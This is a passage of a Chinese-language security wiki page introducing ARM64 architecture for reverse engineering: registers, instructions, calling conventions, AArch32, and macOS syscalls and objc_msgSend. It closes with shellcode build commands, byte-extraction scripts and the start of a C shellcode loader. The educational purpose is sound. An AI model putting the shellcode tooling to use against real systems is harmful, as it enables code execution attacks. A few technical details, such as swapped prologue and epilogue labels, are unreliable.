# ARM64v8 简介

{{#include ../../../banners/hacktricks-training.md}}


## **异常级别 - EL（ARM64v8）**

在 ARMv8 架构中，执行级别称为异常级别（Exception Levels，EL），用于定义执行环境的权限级别和能力。共有四个异常级别，从 EL0 到 EL3，每个级别具有不同用途：

1. **EL0 - 用户模式**：
- 这是权限最低的级别，用于执行常规应用程序代码。
- 在 EL0 运行的应用程序彼此隔离，也与系统软件隔离，从而增强安全性和稳定性。
2. **EL1 - 操作系统内核模式**：
- 大多数操作系统内核运行在此级别。
- EL1 比 EL0 拥有更多权限，可以访问系统资源，但仍受到一些限制，以确保系统完整性。通过 `SVC` 指令可以从 EL0 切换到 EL1。
3. **EL2 - Hypervisor 模式**：
- 此级别用于虚拟化。运行在 EL2 的 Hypervisor 可以管理多个操作系统（每个操作系统运行在自己的 EL1 中），并让它们共享同一物理硬件。
- EL2 提供了用于隔离和控制虚拟化环境的功能。
- 因此，Parallels 等虚拟机应用可以使用 `hypervisor.framework` 与 EL2 交互并运行虚拟机，而不需要内核扩展。
- 从 EL1 切换到 EL2 使用 `HVC` 指令。
4. **EL3 - Secure Monitor 模式**：
- 这是权限最高的级别，通常用于安全启动和可信执行环境。
- EL3 可以管理和控制安全状态与非安全状态之间的访问（例如安全启动、可信 OS 等）。
- macOS 曾使用它实现 KPP（Kernel Patch Protection），但现在已经不再使用。
- Apple 现在也不再使用 EL3。
- 通常使用 `SMC`（Secure Monitor Call）指令切换到 EL3。

使用这些级别可以以结构化且安全的方式管理系统的不同部分，从用户应用程序到权限最高的系统软件。ARMv8 对权限级别的设计有助于有效隔离不同的系统组件，从而增强系统的安全性和健壮性。

## **寄存器（ARM64v8）**

ARM64 有 **31 个通用寄存器**，名称为 `x0` 到 `x30`。每个寄存器都可以存储一个 **64 位**（8 字节）值。对于只需要 32 位值的操作，可以使用名称 w0 到 w30，以 32 位模式访问相同的寄存器。

1. **`x0`** 到 **`x7`** - 通常用作 scratch registers，以及向子程序传递参数。
- **`x0`** 还用于保存函数的返回数据
2. **`x8`** - 在 Linux kernel 中，`x8` 用作 `svc` 指令的系统调用编号。**在 macOS 中使用的是 x16！**
3. **`x9`** 到 **`x15`** - 更多临时寄存器，通常用于保存局部变量。
4. **`x16`** 和 **`x17`** - **过程内调用寄存器（Intra-procedural Call Registers）**。用于保存立即数的临时寄存器。它们还用于间接函数调用和 PLT（Procedure Linkage Table）stub。
- 在 **macOS** 中，**`x16`** 用作 **`svc`** 指令的**系统调用编号**。
5. **`x18`** - **平台寄存器**。它可以作为通用寄存器使用，但在某些平台上会保留用于平台特定用途：在 Windows 中指向当前线程的环境块，或用于指向 **Linux kernel 中当前正在执行的 task structure**。
6. **`x19`** 到 **`x28`** - 这些是被调用者保存寄存器。函数必须为调用者保留这些寄存器的值，因此它们会被保存到 stack，并在返回调用者之前恢复。
7. **`x29`** - 用于跟踪 stack frame 的 **frame pointer**。当函数调用创建新的 stack frame 时，**`x29`** 寄存器会被**保存到 stack**，而**新的** frame pointer 地址（即 **`sp`** 地址）会被**保存到该寄存器**。
- 该寄存器也可以作为**通用寄存器**使用，但通常用作**局部变量**的引用。
8. **`x30`** 或 **`lr`** - **link register**。执行 `BL`（Branch with Link）或 `BLR`（Branch with Link to Register）指令时，它会保存返回地址，即将 **`pc`** 值存储到该寄存器中。
- 它也可以像其他寄存器一样使用。
- 如果当前函数将要调用新函数并因此覆盖 `lr`，它会在开始时将 `lr` 保存到 stack 中，这就是 epilogue（`stp x29, x30 , [sp, #-48]; mov x29, sp` -> 保存 `fp` 和 `lr`，分配空间并获取新的 `fp`），并在结束时恢复它，这就是 prologue（`ldp x29, x30, [sp], #48; ret` -> 恢复 `fp` 和 `lr` 并返回）。
9. **`sp`** - **stack pointer**，用于跟踪 stack 顶部。
- **`sp`** 的值应始终至少保持 **quadword 对齐**，否则可能发生对齐异常。
10. **`pc`** - **program counter**，指向下一条指令。该寄存器只能通过异常生成、异常返回和分支进行更新。唯一可以读取该寄存器的普通指令是带 link 的分支指令（BL、BLR），它们会将 **`pc`** 地址保存到 **`lr`**（Link Register）中。
11. **`xzr`** - **zero register**。在 **32** 位寄存器形式中也称为 **`wzr`**。可用于轻松获取零值（常见操作），或使用 **`subs`** 执行比较，例如 **`subs XZR, Xn, #10`**，将结果丢弃（保存到 **`xzr`** 中）。

**`Wn`** 寄存器是 **`Xn`** 寄存器的 **32 位**版本。

> [!TIP]
> X0 - X18 寄存器是 volatile 的，这意味着函数调用和中断可以更改它们的值。而 X19 - X28 寄存器是 non-volatile 的，这意味着它们的值必须在函数调用期间保持不变（“callee saved”）。

### SIMD 和浮点寄存器

此外，还有 **32 个长度为 128 位的寄存器**，可用于优化的单指令多数据（SIMD）操作以及执行浮点运算。它们称为 Vn 寄存器，但也可以以 **64** 位、**32** 位、**16** 位和 **8** 位模式运行，此时分别称为 **`Qn`**、**`Dn`**、**`Sn`**、**`Hn`** 和 **`Bn`**。

### 系统寄存器

**系统寄存器有数百个**，也称为 special-purpose registers（SPRs），用于**监控**和**控制** **processors** 的行为。\
它们只能使用专用的特殊指令 **`mrs`** 和 **`msr`** 进行读取或设置。

在 reverse engineering 中经常会遇到特殊寄存器 **`TPIDR_EL0`** 和 **`TPIDDR_EL0`**。后缀 `EL0` 表示可以访问该寄存器的**最低异常级别**（本例中 EL0 是普通程序运行时使用的常规异常（权限）级别）。\
它们通常用于存储 thread-local storage 内存区域的**基地址**。通常，第一个寄存器对于运行在 EL0 的程序可读写，而第二个寄存器可以从 EL0 读取，并从 EL1（例如 kernel）写入。

- `mrs x0, TPIDR_EL0 ; 将 TPIDR_EL0 读取到 x0`
- `msr TPIDR_EL0, X0 ; 将 x0 写入 TPIDR_EL0`

### **PSTATE**

**PSTATE** 包含多个进程组件，这些组件会被序列化到操作系统可见的 **`SPSR_ELx`** 特殊寄存器中，其中 X 是触发异常的**权限级别**（这样可以在异常结束时恢复进程状态）。\
以下字段可访问：

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**、**`Z`**、**`C`** 和 **`V`** 条件标志：
- **`N`** 表示操作产生了负数结果
- **`Z`** 表示操作产生了零
- **`C`** 表示操作产生了进位
- **`V`** 表示操作产生了有符号溢出：
- 两个正数相加得到负数结果。
- 两个负数相加得到正数结果。
- 在减法中，当用较小的正数减去较大的负数（反之亦然），且结果无法在给定位数的表示范围内表示时。
- 显然，processor 不知道操作是有符号还是无符号，因此会在操作中检查 C 和 V，并在发生进位时指示其属于有符号还是无符号情况。

> [!WARNING]
> 并非所有指令都会更新这些标志。一些指令（如 **`CMP`** 或 **`TST`**）会更新它们，其他带有 s 后缀的指令（如 **`ADDS`**）也会更新它们。

- 当前**寄存器宽度（`nRW`）标志**：如果该标志值为 0，程序恢复运行后将处于 AArch64 execution state。
- 当前 **Exception Level**（**`EL`**）：在 EL0 中运行的普通程序，其值为 0
- **single stepping** 标志（**`SS`**）：debugger 可通过异常将 **`SPSR_ELx`** 中的 SS 标志设置为 1，从而进行 single step。程序运行一步后会触发 single step exception。
- **非法异常状态标志**（**`IL`**）：用于标记特权 software 执行无效的异常级别转移；该标志会被设置为 1，processor 随后触发 illegal state exception。
- **`DAIF`** 标志：这些标志允许特权程序有选择地屏蔽某些外部异常。
- 如果 **`A`** 为 1，则会触发**异步中止**。**`I`** 用于配置是否响应外部硬件 **Interrupt Requests**（IRQ），而 F 与 **Fast Interrupt Requests**（FIR）相关。
- **stack pointer select** 标志（**`SPS`**）：运行在 EL1 及以上级别的特权程序，可以在使用自身的 stack pointer 寄存器和 user-model stack pointer 之间切换（例如在 `SP_EL1` 和 `EL0` 之间切换）。该切换通过写入 **`SPSel`** 特殊寄存器完成。EL0 无法执行此操作。

## **调用约定（ARM64v8）**

ARM64 调用约定规定，函数的**前八个参数**通过 **`x0`** 到 **`x7`** 寄存器传递。**其他**参数通过 **stack** 传递。返回值通过 **`x0`** 寄存器返回；如果返回值长度为 **128 位**，则也会使用 **`x1`**。函数调用期间必须保留 **`x19`** 到 **`x30`** 以及 **`sp`** 寄存器。

阅读 assembly 中的函数时，应查找 **function prologue 和 epilogue**。**prologue** 通常包括**保存 frame pointer（`x29`）**、设置**新的 frame pointer**，以及**分配 stack 空间**。**epilogue** 通常包括**恢复保存的 frame pointer** 并从函数中**返回**。

### Swift 中的调用约定

Swift 有自己的**调用约定**，可以在[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)中找到。

## **常见指令（ARM64v8）**

ARM64 指令通常采用 **`opcode dst, src1, src2`** 格式，其中 **`opcode`** 是要执行的**操作**（例如 `add`、`sub`、`mov` 等），**`dst`** 是用于存储结果的**目标**寄存器，**`src1`** 和 **`src2`** 是**源**寄存器。也可以使用立即数代替源寄存器。

- **`mov`**：将值从一个**寄存器移动**到另一个寄存器。
- 示例：`mov x0, x1` — 将 `x1` 中的值移动到 `x0`。
- **`ldr`**：将值从**内存加载**到**寄存器**。
- 示例：`ldr x0, [x1]` — 将 `x1` 指向的内存位置中的值加载到 `x0`。
- **Offset mode**：表示影响原始 pointer 的偏移量，例如：
- `ldr x2, [x1, #8]`，将 `x1 + 8` 处的值加载到 x2
- `ldr x2, [x0, x1, lsl #2]`，将数组 x0 中索引为 x1 的对象加载到 x2，索引乘以 4
- **Pre-indexed mode**：对 origin 执行计算，获取结果，并将新的 origin 保存回 origin。
- `ldr x2, [x1, #8]!`，将 `x1 + 8` 加载到 `x2`，并将 `x1 + 8` 的结果保存到 x1
- `str lr, [sp, #-4]!`，将 link register 保存到 sp，并更新 sp 寄存器
- **Post-index mode**：与前一种模式类似，但会先访问内存地址，然后计算偏移量并保存。
- `ldr x0, [x1], #8`，将 `x1` 加载到 `x0`，并将 x1 更新为 `x1 + 8`
- **PC-relative addressing**：在此情况下，要加载的地址是相对于 PC 寄存器计算的
- `ldr x1, =_start`，将 `_start` 符号的起始地址（相对于当前 PC）加载到 x1。
- **`str`**：将值从**寄存器存储**到**内存**。
- 示例：`str x0, [x1]` — 将 `x0` 中的值存储到 `x1` 指向的内存位置。
- **`ldp`**：**Load Pair of Registers**。该指令从**连续的内存**位置加载两个寄存器。内存地址通常通过将偏移量加到另一个寄存器的值上形成。
- 示例：`ldp x0, x1, [x2]` — 分别从 `x2` 和 `x2 + 8` 处的内存位置加载 `x0` 和 `x1`。
- **`stp`**：**Store Pair of Registers**。该指令将两个寄存器存储到**连续的内存**位置。内存地址通常通过将偏移量加到另一个寄存器的值上形成。
- 示例：`stp x0, x1, [sp]` — 分别将 `x0` 和 `x1` 存储到 `sp` 和 `sp + 8` 处的内存位置。
- `stp x0, x1, [sp, #16]!` — 将 `x0` 和 `x1` 分别存储到 `sp+16` 和 `sp + 24` 处的内存位置，并将 `sp` 更新为 `sp+16`。
- **`add`**：将两个寄存器的值**相加**，并将结果存储到寄存器中。
- 语法：add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> 目标
- Xn2 -> 操作数 1
- Xn3 | #imm -> 操作数 2（寄存器或立即数）
- \[shift #N | RRX] -> 执行 shift 或调用 RRX
- 示例：`add x0, x1, x2` — 将 `x1` 和 `x2` 的值相加，并将结果存储到 `x0`。
- `add x5, x5, #1, lsl #12` — 结果等于 4096（将 1 左移 12 次）-> 1 0000 0000 0000 0000
- **`adds`**：执行 `add` 并更新标志
- **`sub`**：将两个寄存器的值**相减**，并将结果存储到寄存器中。
- 查看 **`add`** 的**语法**。
- 示例：`sub x0, x1, x2` — 从 `x1` 中减去 `x2` 的值，并将结果存储到 `x0`。
- **`subs`**：类似于 sub，但会更新标志
- **`mul`**：将**两个寄存器**的值相乘，并将结果存储到寄存器中。
- 示例：`mul x0, x1, x2` — 将 `x1` 和 `x2` 的值相乘，并将结果存储到 `x0`。
- **`div`**：将一个寄存器的值除以另一个寄存器，并将结果存储到寄存器中。
- 示例：`div x0, x1, x2` — 将 `x1` 的值除以 `x2`，并将结果存储到 `x0`。
- **`lsl`**、**`lsr`**、**`asr`**、**`ror`、`rrx`**：
- **Logical shift left**：从末尾添加 0，并将其他位向前移动（乘以 2 的 n 次方）
- **Logical shift right**：在开头添加 1，并将其他位向后移动（无符号除以 2 的 n 次方）
- **Arithmetic shift right**：类似 **`lsr`**，但如果最高有效位为 1，则不添加 0，而是添加 **1**（有符号除以 2 的 n 次方）
- **Rotate right**：类似 **`lsr`**，但从右侧移出的位会追加到左侧
- **Rotate Right with Extend**：类似 **`ror`**，但将 carry flag 作为“最高有效位”。因此，carry flag 会移动到第 31 位，而移出的位会进入 carry flag。
- **`bfm`**：**Bit Field Move**，这些操作会从一个值中**复制位 `0...n`**，并将其放置到 **`m..m+n`** 位置。**`#s`** 指定**最左侧位**的位置，**`#r`** 指定向右旋转的数量。
- Bitfield move：`BFM Xd, Xn, #r`
- Signed Bitfield move：`SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move：`UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert**：从一个寄存器复制 bitfield，并将其复制到另一个寄存器。
- **`BFI X1, X2, #3, #4`**：从 X2 中提取 4 位，并从 X1 的第 3 位开始插入
- **`BFXIL X1, X2, #3, #4`**：从 X2 的第 3 位提取 4 位，并将其复制到 X1
- **`SBFIZ X1, X2, #3, #4`**：对 X2 中的 4 位进行符号扩展，并从位位置 3 开始插入 X1，同时将右侧位清零
- **`SBFX X1, X2, #3, #4`**：从 X2 的第 3 位开始提取 4 位，对其进行符号扩展，并将结果放入 X1
- **`UBFIZ X1, X2, #3, #4`**：对 X2 中的 4 位进行零扩展，并从位位置 3 开始插入 X1，同时将右侧位清零
- **`UBFX X1, X2, #3, #4`**：从 X2 的第 3 位开始提取 4 位，并将零扩展后的结果放入 X1。
- **Sign Extend To X**：扩展值的符号（无符号版本中仅添加 0），以便对其执行操作：
- **`SXTB X1, W2`**：将 **W2 中的一个字节扩展到 X1**（`W2` 是 `X2` 的一半）以填充 64 位
- **`SXTH X1, W2`**：将 **W2 中的 16 位数扩展到 X1** 以填充 64 位
- **`SXTW X1, W2`**：将 **W2 中的一个字节扩展到 X1** 以填充 64 位
- **`UXTB X1, W2`**：向 **W2 到 X1** 的一个字节添加 0（无符号）以填充 64 位
- **`extr`**：从指定的**拼接寄存器对**中提取位。
- 示例：`EXTR W3, W2, W1, #3` 将 **W1+W2 拼接**，然后获取**从 W2 的第 3 位到 W1 的第 3 位**的内容，并将其存储到 W3。
- **`cmp`**：**比较**两个寄存器并设置条件标志。它是将目标寄存器设置为 zero register 的 **`subs` 别名**。可用于判断 `m == n`。
- 它支持与 `subs` **相同的语法**
- 示例：`cmp x0, x1` — 比较 `x0` 和 `x1` 中的值，并相应设置条件标志。
- **`cmn`**：**比较负数**操作数。它是 **`adds`** 的别名，并支持相同语法。可用于判断 `m == -n`。
- **`ccmp`**：条件比较，只有在前一次比较为 true 时才会执行，并会专门设置 nzcv 位。
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> 如果 x1 != x2 且 x3 < x4，则跳转到 func
- 这是因为只有当上一次 `cmp` 的结果为 `NE` 时才会执行 **`ccmp`**；如果不是，`nzcv` 位会被设置为 0（无法满足 `blt` 比较条件）。
- 也可以使用 `ccmn`（与 `ccmp` 类似但为负数版本，就像 `cmp` 与 `cmn` 的关系）。
- **`tst`**：检查比较值中是否存在两者都为 1 的位（其工作方式类似于不保存结果的 ANDS）。它可用于检查寄存器中的某些位是否为 1。
- 示例：`tst X1, #7` 检查 X1 的最后 3 位中是否有任意一位为 1
- **`teq`**：执行 XOR 操作并丢弃结果
- **`b`**：无条件 Branch
- 示例：`b myFunction`
- 注意，该指令不会将返回地址写入 link register（不适合需要返回的 subrutine 调用）
- **`bl`**：带 link 的 **Branch**，用于**调用** subroutine。将**返回地址保存到 `x30`**。
- 示例：`bl myFunction` — 调用函数 `myFunction`，并将返回地址保存到 `x30`。
- 注意，该指令不会将返回地址写入 link register（不适合需要返回的 subrutine 调用）
- **`blr`**：到寄存器的带 Link Branch，用于调用目标地址存储在**寄存器**中的 subroutine。将返回地址保存到 `x30`。（这是
- 示例：`blr x1` — 调用地址包含在 `x1` 中的函数，并将返回地址保存到 `x30`。
- **`ret`**：从 **subroutine** 返回，通常使用 **`x30`** 中的地址。
- 示例：`ret` — 使用 `x30` 中的返回地址从当前 subroutine 返回。
- **`b.<cond>`**：条件分支
- **`b.eq`**：基于之前的 `cmp` 指令，**相等时 Branch**。
- 示例：`b.eq label` — 如果之前的 `cmp` 指令发现两个值相等，则跳转到 `label`。
- **`b.ne`**：**不相等时 Branch**。该指令检查条件标志（由之前的比较指令设置），如果比较的值不相等，则跳转到某个 label 或地址。
- 示例：执行 `cmp x0, x1` 后，`b.ne label` — 如果 `x0` 和 `x1` 中的值不相等，则跳转到 `label`。
- **`cbz`**：**Compare and Branch on Zero**。该指令将寄存器与零比较，如果两者相等，则跳转到某个 label 或地址。
- 示例：`cbz x0, label` — 如果 `x0` 的值为零，则跳转到 `label`。
- **`cbnz`**：**Compare and Branch on Non-Zero**。该指令将寄存器与零比较，如果两者不相等，则跳转到某个 label 或地址。
- 示例：`cbnz x0, label` — 如果 `x0` 的值非零，则跳转到 `label`。
- **`tbnz`**：测试位，非零时 Branch
- 示例：`tbnz x0, #8, label`
- **`tbz`**：测试位，为零时 Branch
- 示例：`tbz x0, #8, label`
- **Conditional select operations**：这些操作的行为会根据条件位而变化。
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> 如果为 true，则 X0 = X1；如果为 false，则 X0 = X2
- `csinc Xd, Xn, Xm, cond` -> 如果为 true，则 Xd = Xn；如果为 false，则 Xd = Xm + 1
- `cinc Xd, Xn, cond` -> 如果为 true，则 Xd = Xn + 1；如果为 false，则 Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> 如果为 true，则 Xd = Xn；如果为 false，则 Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> 如果为 true，则 Xd = NOT(Xn)；如果为 false，则 Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> 如果为 true，则 Xd = Xn；如果为 false，则 Xd = - Xm
- `cneg Xd, Xn, cond` -> 如果为 true，则 Xd = - Xn；如果为 false，则 Xd = Xn
- `cset Xd, Xn, Xm, cond` -> 如果为 true，则 Xd = 1；如果为 false，则 Xd = 0
- `csetm Xd, Xn, Xm, cond` -> 如果为 true，则 Xd = \<all 1>；如果为 false，则 Xd = 0
- **`adrp`**：计算**符号的 page address**，并将其存储到寄存器中。
- 示例：`adrp x0, symbol` — 计算 `symbol` 的 page address，并将其存储到 `x0`。
- **`ldrsw`**：从内存加载一个有符号的 **32 位**值，并将其**符号扩展为 64 位**。常用于常见的 SWITCH 情况。
- 示例：`ldrsw x0, [x1]` — 从 `x1` 指向的内存位置加载有符号 32 位值，将其符号扩展为 64 位，并存储到 `x0`。
- **`stur`**：使用相对于另一个寄存器的偏移量，将寄存器值**存储到内存位置**。
- 示例：`stur x0, [x1, #4]` — 将 `x0` 中的值存储到比 `x1` 当前地址大 4 字节的内存地址中。
- **`svc`**：执行**系统调用**。它代表 “Supervisor Call”。processor 执行该指令时，会**从用户模式切换到 kernel mode**，并跳转到内存中特定的位置，该位置存放 **kernel 的 system call handling** 代码。

- 示例：

```armasm
mov x8, 93  ; 将 exit 的系统调用编号（93）加载到寄存器 x8。
mov x0, 0   ; 将退出状态码（0）加载到寄存器 x0。
svc 0       ; 执行系统调用。
```

### **Function Prologue**

1. **将 link register 和 frame pointer 保存到 stack**：
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **设置新的帧指针**：`mov x29, sp`（为当前函数设置新的帧指针）
3. **在栈上为局部变量分配空间**（如有需要）：`sub sp, sp, <size>`（其中 `<size>` 是所需的字节数）

### **函数尾声**

1. **释放局部变量占用的空间**（如已分配）：`add sp, sp, <size>`
2. **恢复链接寄存器和帧指针**：
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret`（使用 link register 中的地址将控制权返回给 caller）

## ARM 常见内存保护机制

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 执行状态

Armv8-A 支持执行 32-bit 程序。**AArch32** 可以运行于两种**指令集**之一：**`A32`** 和 **`T32`**，并且可以通过 **`interworking`** 在两者之间切换。\
**Privileged** 64-bit 程序可以通过执行向较低权限 32-bit exception level 的转移，来调度**执行 32-bit** 程序。\
需要注意的是，从 64-bit 到 32-bit 的转换会伴随 exception level 降低（例如，EL1 中的 64-bit 程序触发 EL0 中的程序）。这是通过在 **`AArch32`** process thread 准备执行时，将特殊寄存器 **`SPSR_ELx`** 的**第 4 位**设置为 **1** 来完成的，而 `SPSR_ELx` 的其余部分则存储 **`AArch32`** 程序的 CPSR。随后，Privileged process 调用 **`ERET`** 指令，使处理器转换到 **`AArch32`**，并根据 CPSR 进入 A32 或 T32**。**

**`interworking`** 使用 CPSR 的 J 位和 T 位完成。`J=0` 且 `T=0` 表示 **`A32`**，而 `J=0` 且 `T=1` 表示 **T32**。这基本上意味着将**最低位设置为 1**，以表示指令集为 T32。\
这会在 **interworking branch instructions** 期间设置，但当 PC 被设置为目标寄存器时，也可以通过其他指令直接设置。例如：

另一个例子：
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

共有 16 个 32-bit registers（r0-r15）。**从 r0 到 r14** 可以用于**任何操作**，不过其中一些通常会被保留：

- **`r15`**：Program counter（始终如此）。包含下一条指令的地址。在 A32 中为当前地址 + 8，在 T32 中为当前地址 + 4。
- **`r11`**：Frame Pointer
- **`r12`**：Intra-procedural call register
- **`r13`**：Stack Pointer（注意 stack 始终按 16-byte 对齐）
- **`r14`**：Link Register

此外，registers 还会备份到 **`banked registries`** 中。这些位置用于存储 registers 的值，从而允许在 exception handling 和 privileged operations 中执行**快速 context switching**，避免每次都需要手动保存和恢复 registers。\
具体来说，会将 processor state 从 **`CPSR` 保存到**发生 exception 的 processor mode 对应的 **`SPSR`** 中。在 exception returns 时，再从 **`SPSR`** 恢复 **`CPSR`**。

### CPSR - Current Program Status Register

在 AArch32 中，CPSR 的工作方式类似于 AArch64 中的 **`PSTATE`**，并且在发生 exception 时也会存储到 **`SPSR_ELx`**，以便稍后恢复执行：

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

这些 fields 分为几个组：

- Application Program Status Register (APSR)：Arithmetic flags，可从 EL0 访问
- Execution State Registers：Process behaviour（由 OS 管理）。

#### Application Program Status Register (APSR)

- **`N`**、**`Z`**、**`C`**、**`V`** flags（与 AArch64 中相同）
- **`Q`** flag：每当执行 specialized saturating arithmetic instruction 时发生**integer saturation**，它就会被设置为 1。一旦设置为 **`1`**，它会一直保持该值，直到被手动设置为 0。此外，没有任何 instruction 会隐式检查它的值，必须通过手动读取来完成。
- **`GE`**（Greater than or equal）Flags：用于 SIMD（Single Instruction, Multiple Data）operations，例如 “parallel add” 和 “parallel subtract”。这些 operations 允许在一条 instruction 中处理多个 data points。

例如，**`UADD8`** instruction 会并行**相加四对 bytes**（来自两个 32-bit operands），并将结果存储到一个 32-bit register 中。随后，它会根据这些结果设置 **APSR 中的 `GE` flags**。每个 GE flag 对应其中一次 byte addition，用于表示该 byte pair 的 addition 是否发生了 **overflow**。

**`SEL`** instruction 使用这些 GE flags 执行 conditional actions。

#### Execution State Registers

- **`J`** 和 **`T`** bits：**`J`** 应为 0；如果 **`T`** 为 0，则使用 A32 instruction set；如果为 1，则使用 T32。
- **IT Block State Register**（`ITSTATE`）：这些是第 10-15 位和第 25-26 位。它们存储 **`IT`** prefixed group 中 instructions 的 conditions。
- **`E`** bit：表示 **endianness**。
- **Mode and Exception Mask Bits**（0-4）：它们决定当前的 execution state。其中第 5 个 bit 表示程序以 32-bit（1）还是 64-bit（0）运行。其他 4 个 bits 表示当前使用的 **exception mode**（发生 exception 并正在处理时）。设置的 number 表示在处理当前 exception 时，如果再次触发另一个 exception，当前的 priority。

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**：某些 exceptions 可以使用 **`A`**、`I`、`F` bits 禁用。如果 **`A`** 为 1，则表示会触发 **asynchronous aborts**。**`I`** 用于配置是否响应外部硬件 **Interrupts Requests**（IRQs）。而 F 与 **Fast Interrupt Requests**（FIRs）相关。

## macOS

### BSD syscalls

查看 [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)，或运行 `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`。BSD syscalls 的 **x16 > 0**。

### Mach Traps

在 [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) 中查看 `mach_trap_table`，并在 [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) 中查看 prototypes。Mach traps 的最大 number 为 `MACH_TRAP_TABLE_COUNT` = 128。Mach traps 的 **x16 < 0**，因此需要在前一个列表中的 numbers 前加上 **minus**：**`_kernelrpc_mach_vm_allocate_trap`** 是 **`-10`**。

你也可以在 disassembler 中检查 **`libsystem_kernel.dylib`**，以查找如何调用这些（以及 BSD）syscalls：
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
请注意，只需传入 cache，**Ida** 和 **Ghidra** 也可以从其中反编译**特定的 dylibs**。

> [!TIP]
> 有时，检查 **`libsystem_kernel.dylib`** 中的**反编译**代码会比检查**源代码**更容易，因为多个 syscall（BSD 和 Mach）的代码是通过脚本生成的（请查看源代码中的注释），而在 dylib 中可以找到实际被调用的内容。

### machdep calls

XNU 还支持另一类称为 machine dependent 的调用。这些调用的编号取决于架构，并且调用本身及其编号都不保证始终保持不变。

### comm page

这是一个由 kernel 所有的内存页，会被映射到每个 userspace process 的地址空间中。这样做是为了让从 user mode 切换到 kernel space 的过程，比通过 syscall 调用 kernel service 更快；对于使用频率很高的 kernel service，使用 syscall 进行这种切换会非常低效。

例如，`gettimeofdate` 调用会直接从 comm page 读取 `timeval` 的值。

### objc_msgSend

在 Objective-C 或 Swift 程序中，经常可以看到这个函数。该函数允许调用 Objective-C 对象的方法。

参数（[更多信息请参阅文档](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)）：<sup>[[4]](#references)</sup>

- x0: self -> 指向实例的 Pointer
- x1: op -> 方法的 Selector
- x2... -> 被调用方法的其余参数

因此，如果你在跳转到此函数之前设置 breakpoint，就可以在 lldb 中轻松找出实际调用的内容（本例中，该对象调用了 `NSConcreteTask` 中的一个对象，该对象将运行一条命令）：
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> 设置环境变量 **`NSObjCMessageLoggingEnabled=1`** 后，可以在类似 `/tmp/msgSends-pid` 的文件中记录该函数被调用的时间。
>
> 此外，设置 **`OBJC_HELP=1`** 并调用任意 binary，可以看到其他可用于 **log** 某些 Objc-C 操作发生时间的环境变量。

调用此函数时，需要查找指定 instance 的被调用 method，为此会执行以下搜索：

- 执行 optimistic cache lookup：
- 如果成功，则完成
- 获取 runtimeLock（read）
- 如果（realize && !cls->realized），则 realize class
- 如果（initialize && !cls->initialized），则 initialize class
- 尝试 class own cache：
- 如果成功，则完成
- 尝试 class method list：
- 如果找到，则填充 cache 并完成
- 尝试 superclass cache：
- 如果成功，则完成
- 尝试 superclass method list：
- 如果找到，则填充 cache 并完成
- 如果（resolver），则尝试 method resolver，并从 class lookup 重新开始
- 如果仍然执行到这里（= 其他所有方式都失败），则尝试 forwarder

### Shellcodes

编译方法：
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
提取字节：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
对于较新的 macOS：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>用于测试 shellcode 的 C 代码</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

